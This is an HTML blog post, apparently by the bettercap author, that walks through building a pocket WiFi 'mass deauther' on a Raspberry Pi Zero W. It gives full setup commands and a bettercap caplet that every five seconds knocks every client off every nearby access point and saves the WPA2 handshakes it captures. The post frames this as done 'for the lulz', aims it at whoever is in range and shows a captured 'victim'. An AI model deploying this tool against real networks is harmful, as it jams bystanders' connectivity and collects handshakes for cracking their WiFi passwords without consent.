@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W | evilsocket / Simone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all t">
+<meta name="keywords" content="bettercap,wifi,ble,bluetooth,raspberry,rpi,rpi zero w,rpi0w,kali,deauth,btnap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W">
+<meta property="og:url" content="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/index.html">
+<meta property="og:site_name" content="evilsocket &#x2F; Simone">
+<meta property="og:description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all t">
+<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/deauth.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/bt.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/net1.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/net2.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/victim.png">
+<meta property="og:image" content="https://abs.twimg.com/emoji/v2/72x72/1f984.png">
+<meta property="og:updated_time" content="2018-07-28T18:50:09.961Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W">
+<meta name="twitter:description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all t">
+<meta name="twitter:image" content="https://www.evilsocket.net/images/2018/07/deauth.png">
+<meta name="twitter:creator" content="@evilsocket">
+<link rel="publisher" href="https://plus.google.com/104794390596458308819">
+
+  <meta name="google-site-verification" content="6qdVG0z0lac2ceITCoTCNm15CPp3K9Sq41_5IK4OLKM">
+
+  
+    <link rel="alternate" href="/atom.xml" title="evilsocket / Simone" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-22026549-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+  <script type="text/javascript" src="https://blockchain.info/Resources/js/pay-now-button.js"></script>
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">evilsocket / Simone</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">I hack stuff.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/random-facts-about-me.html">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <a id="nav-github-link" class="nav-icon" href="https://github.com/evilsocket" target="_blank"></a>
+        <a id="nav-linkedin-link" class="nav-icon" href="http://it.linkedin.com/in/simonemargaritelli/" target="_blank"></a>
+        <a id="nav-twitter-link" class="nav-icon" href="https://twitter.com/evilsocket" target="_blank"></a>
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.evilsocket.net"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W
+    </h1>
+  
+
+      </header>
+    
+    <br/>
+    <div class="article-meta">
+      Posted on <time datetime="2018-07-28T17:01:56.000Z" itemprop="datePublished">2018-07-28</time>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <br/>
+        <div class="addthis_sharing_toolbox"></div>
+        <p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
+<p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a href="https://twitter.com/evilsocket/status/1021367629901115392" target="_blank" rel="external">the interest the tweet had</a> I thought to share this writeup :)</p>
+<p><img src="/images/2018/07/deauth.png" alt="deauth"></p>
+<center><small><i>This awesome case has been designed by <a href="https://twitter.com/elkentaro" target="_blank">@elkentaro</a> and can be found on <a href="https://www.thingiverse.com/thing:3018480" target="_blank" rel="external">his Thingverse page</a>.</i></small></center>
+
+<a id="more"></a>
+<h3 id="0x00-FAQ"><a href="#0x00-FAQ" class="headerlink" title="[0x00] FAQ"></a>[0x00] FAQ</h3><p><strong>Why not using Nethunter or some other Kali image for Android and a smartphone instead?</strong></p>
+<p>Monitor mode works, injection doesn’t. Using an external WiFi makes the whole thing bigger and kills the battery.</p>
+<p><strong>Why not using … instead?</strong></p>
+<p>There are many alternatives to the setup I’m going to describe, it’s not necessarily the best, just the one that works for me.</p>
+<p><strong>Why …?</strong></p>
+<p>BECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.</p>
+<h3 id="0x01-Kali-image-and-initial-headless-configuration"><a href="#0x01-Kali-image-and-initial-headless-configuration" class="headerlink" title="[0x01] Kali image and initial headless configuration."></a>[0x01] Kali image and initial headless configuration.</h3><p>First thing first, you’ll need to download the <strong>Kali Linux Rpi0w Nexmon</strong> image from <a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="external">this page</a> and burn it to the uSD card you’re going to use for the rpi using the usual <code>dd</code> method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.</p>
+<p>From the computer you used to burn the image on your micro sd, mount it again if needed and then:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># this will enable ssh at boot</span></div><div class="line">touch /sd-mount-point/boot/ssh</div><div class="line"><span class="comment"># let's setup wlan0</span></div><div class="line">nano /sd-mount-point/root/etc/network/interfaces</div></pre></td></tr></table></figure>
+<p>Fill this file with the following contents:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line"></div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line">iface default inet dhcp</div></pre></td></tr></table></figure>
+<p>Now we’ll add the details of the WiFi network we want the rpi to connect automatically for configuration:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nano /sd-mount-point/root/etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
+<p>And add this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">country=GB</div><div class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class="line">update_config=1</div><div class="line"></div><div class="line">network=&#123;</div><div class="line">        ssid=&quot;YourWiFiName&quot;</div><div class="line">        psk=&quot;y0urw1f!p455w0rd&quot;</div><div class="line">        key_mgmt=WPA-PSK</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Reboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the <a href="https://github.com/bettercap/caplets/blob/master/netmon.cap" target="_blank" rel="external">netmon</a> caplet to see what’s going on on my network) and finally SSH to it using the default Kali credentials:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># this will allow you to login with your SSH key instead of a password</span></div><div class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip</div><div class="line">ssh root@pita-ip</div></pre></td></tr></table></figure>
+<p>Once you’re logged in:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># always change the default root password</span></div><div class="line">passwd</div><div class="line"><span class="comment"># regenerate ssh keys</span></div><div class="line">ssh-keygen</div><div class="line"><span class="comment"># set a nicer hostname :D</span></div><div class="line">hostname -b pita</div><div class="line"><span class="built_in">echo</span> pita &gt; /etc/hostname</div><div class="line"><span class="built_in">echo</span> <span class="string">"127.0.0.1 pita"</span> &gt;&gt; /etc/hosts</div><div class="line"><span class="comment"># update the system</span></div><div class="line">apt update </div><div class="line">apt upgrade</div><div class="line"><span class="comment"># install a few useful packages and setup swap</span></div><div class="line">apt install git dphys-swapfile</div><div class="line"><span class="comment"># set CONF\_SWAPSIZE to 1024</span></div><div class="line">nano /etc/dphys-swapfile</div><div class="line">systemctl <span class="built_in">enable</span> dphys-swapfile</div><div class="line"><span class="comment"># reboot to apply the effects</span></div><div class="line">reboot</div></pre></td></tr></table></figure>
+<h3 id="0x02-Connecting-via-Bluetooth-with-bt-nap"><a href="#0x02-Connecting-via-Bluetooth-with-bt-nap" class="headerlink" title="[0x02] Connecting via Bluetooth with bt-nap"></a>[0x02] Connecting via Bluetooth with bt-nap</h3><p>We want to use <code>wlan0</code> for the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.</p>
+<center><br><blockquote class="twitter-tweet" data-conversation="none" data-lang="it"><p lang="en" dir="ltr">Power from your smartphone, ssh over bluetooth and a mass deauther in your pocket 😈<a href="https://twitter.com/bettercap?ref_src=twsrc%5Etfw" target="_blank" rel="external">@bettercap</a> + <a href="https://twitter.com/hashtag/pita?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="external">#pita</a> = ❤️ <a href="https://t.co/lDn9Tie3W9" target="_blank" rel="external">pic.twitter.com/lDn9Tie3W9</a></p>&mdash; 👽 (@evilsocket) <a href="https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw" target="_blank" rel="external">23 luglio 2018</a></blockquote><br><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>
+
+<p>Let’s connect once more via WiFi and SSH:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ssh root@pita-ip</div><div class="line"></div><div class="line"><span class="comment"># install a few dependencies</span></div><div class="line">apt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth</div><div class="line">git <span class="built_in">clone</span> https://github.com/bablokb/pi-btnap</div><div class="line"><span class="comment"># install btnap as a server</span></div><div class="line">./pi-btnap/tools/install-btnap server</div></pre></td></tr></table></figure>
+<p>Fix the bluetooth configuration file <code>/etc/systemd/system/bluetooth.target.wants/bluetooth.service</code> by disabling the SAP plugin that would break bluetooth, change the <code>ExecStart</code> part with:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ExecStart=/usr/lib/bluetooth/bluetoothd --noplugin=sap</div></pre></td></tr></table></figure>
+<p>Let’s set the bluetooth name of your device by editing <code>/etc/bluetooth/main.conf</code> and finally edit the btnap configuration file itself, <code>/etc/btnap.conf</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MODE=&quot;server&quot;</div><div class="line">BR_DEV=&quot;br0&quot;</div><div class="line">BR_IP=&quot;192.168.20.99/24&quot;</div><div class="line">BR_GW=&quot;192.168.20.1&quot; </div><div class="line">ADD_IF=&quot;lo&quot; </div><div class="line">REMOTE_DEV=&quot;&quot; </div><div class="line">DEBUG=&quot;&quot;</div></pre></td></tr></table></figure>
+<p>Enable all the services at boot and restart them:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">systemctl <span class="built_in">enable</span> bluetooth</div><div class="line">systemctl <span class="built_in">enable</span> btnap</div><div class="line">systemctl <span class="built_in">enable</span> dnsmasq</div><div class="line"></div><div class="line">service bluetooth restart</div><div class="line">service dnsmasq restart</div><div class="line">service btnap restart</div></pre></td></tr></table></figure>
+<p>Before being able to connect via bluetooth, we need to manually pair and trust the device we’re going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it’s visible, then from the pita:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">bluetoothctl</div><div class="line">&gt; agent on</div><div class="line">&gt; scan on</div><div class="line">... <span class="built_in">wait</span> <span class="keyword">for</span> your device to show up ...</div><div class="line">...</div><div class="line">... now pair with its address</div><div class="line">&gt; pair aa:bb:cc:dd:ee:ff</div><div class="line">... and trust it permantently ...</div><div class="line">&gt; trust aa:bb:cc:dd:ee:ff</div><div class="line">... <span class="built_in">wait</span> ...</div><div class="line">&gt; quit</div></pre></td></tr></table></figure>
+<p>We’re now ready to “free” the wlan0 interface and use it for more cool stuff, let’s change the file <code>/etc/network/interfaces</code> to:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet static</div></pre></td></tr></table></figure>
+<p>From the board now, disable wpa_supplicant and reboot:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service wpa_supplicant <span class="built_in">disable</span></div><div class="line">reboot</div></pre></td></tr></table></figure>
+<p>After reboot, you’ll be able to connect to the board via bluetooth.</p>
+<p><img src="/images/2018/07/bt.png" alt="bt"></p>
+<p>Your system (this depends on the system you’re using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based <code>Pita Network</code> entry in the network manager:</p>
+<p><img src="/images/2018/07/net1.png" alt="pita network"></p>
+<p>Once connected, you should see a new <code>bnep0</code> network interface:</p>
+<p><img src="/images/2018/07/net2.png" alt="ifconfig"></p>
+<p>You can finally ssh to your PITA board via bluetooth now :)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"192.168.20.99 pita"</span> &gt;&gt; /etc/hosts</div><div class="line">ssh root@pita</div></pre></td></tr></table></figure>
+<h3 id="0x03-Having-fun-with-wlan0-and-bettercap"><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="headerlink" title="[0x03] Having fun with wlan0 and bettercap"></a>[0x03] Having fun with wlan0 and bettercap</h3><p>Now that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it’ll take a while but it’s very easy:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">apt install golang libpcap-dev libnetfilter-queue-dev wget build-essentials</div><div class="line"><span class="comment"># you should make this persistent in your .bashrc or .zshrc file</span></div><div class="line"><span class="built_in">export</span> GOPATH=/root/gocode</div><div class="line">mkdir -p <span class="variable">$GOPATH</span></div><div class="line">go get github.com/bettercap/bettercap</div><div class="line"><span class="comment"># wait</span></div><div class="line"><span class="comment"># let's install it for everyone to enjoy ^_^</span></div><div class="line"><span class="built_in">cd</span> /root/gocode/src/github.com/bettercap/bettercap</div><div class="line">make install</div><div class="line"><span class="comment"># let's download the pita.cap caplet</span></div><div class="line"><span class="built_in">cd</span> /usr/share/bettercap/caplets/</div><div class="line">wget <span class="string">"https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap"</span></div></pre></td></tr></table></figure>
+<p>The <a href="https://github.com/bettercap/caplets/blob/master/pita.cap" target="_blank" rel="external">pita.cap</a> caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the <a href="https://github.com/bettercap/caplets" target="_blank" rel="external">caplets repo</a> and generally in the project <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="external">wiki</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"># More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392</div><div class="line"></div><div class="line">set $ &#123;bold&#125;😈 » &#123;reset&#125;</div><div class="line"></div><div class="line"># make sure wlan0 is in monitor mode</div><div class="line"># ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh</div><div class="line">!monstop</div><div class="line">!monstart</div><div class="line"></div><div class="line"># every 5 seconds:</div><div class="line"># - clear the screen</div><div class="line"># - show the list of nearby access points </div><div class="line"># - deauth every client from each one of them</div><div class="line">set ticker.period 5</div><div class="line">set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff</div><div class="line"># sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.</div><div class="line">set net.sniff.verbose true</div><div class="line">set net.sniff.filter ether proto 0x888e</div><div class="line">set net.sniff.output wpa.pcap</div><div class="line"></div><div class="line"># uncomment to only hop on these channels:</div><div class="line"># wifi.recon.channel 1,2,3</div><div class="line">wifi.recon on</div><div class="line">ticker on</div><div class="line">net.sniff on</div><div class="line"></div><div class="line"># we&apos;ll see lots of probes after each deauth, just skip the noise ...</div><div class="line">events.ignore wifi.client.probe</div><div class="line"># start fresh</div><div class="line">events.clear</div><div class="line">clear</div></pre></td></tr></table></figure>
+<p>To start bettercap with this caplet:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ifconfig wlan0 up</div><div class="line">bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap</div><div class="line"><span class="comment"># enjoy ^_^</span></div></pre></td></tr></table></figure>
+<p>Just after a few minutes my prototype was able to deauth and capture the handshake of some device:</p>
+<p><img src="/images/2018/07/victim.png" alt="victim"></p>
+<p>I hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn’t work for you and I’ll try to help and fix this writeup, as usual, <strong>enjoy!</strong></p>
+<center><br><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"><br></center>
+
+      
+      
+      <hr/>
+      <center>
+
+        <div style="font-size:16px;margin:0 auto;width:300px" class="blockchain-btn"
+        data-address="16xFm5NrKV6eEV4TTDEUdkjqe62L352apW"
+        data-shared="false">
+        <div class="blockchain stage-begin">
+        <img src="https://blockchain.info/Resources/buttons/donate_64.png"/>
+        </div>
+        <div class="blockchain stage-loading" style="text-align:center">
+        <img src="https://blockchain.info/Resources/loading-large.gif"/>
+        </div>
+        <div class="blockchain stage-ready">
+        <p align="center">Please Donate To Bitcoin Address: <b>[[address]]</b></p>
+        <p align="center" class="qr-code"></p>
+        </div>
+        <div class="blockchain stage-paid">
+        Donation of <b>[[value]] BTC</b> Received. Thank You.
+        </div>
+        <div class="blockchain stage-error">
+        <font color="red">[[error]]</font>
+        </div>
+        </div>
+
+        <p style="font-size:27px">
+            Let's stay in touch!
+            <br/>
+            <a href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false" data-size="large">Follow @evilsocket</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+        </p>
+      </center>
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bettercap/">bettercap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ble/">ble</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bluetooth/">bluetooth</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/btnap/">btnap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/deauth/">deauth</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/raspberry/">raspberry</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rpi/">rpi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rpi-zero-w/">rpi zero w</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rpi0w/">rpi0w</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wifi/">wifi</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Go Is Amazing, So Here&#39;s What I Don&#39;t Like About It</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 Simone Margaritelli<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4da572964da15ce9" async="async"></script>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/random-facts-about-me.html" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'evilsocket';
+  
+  var disqus_url = 'https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
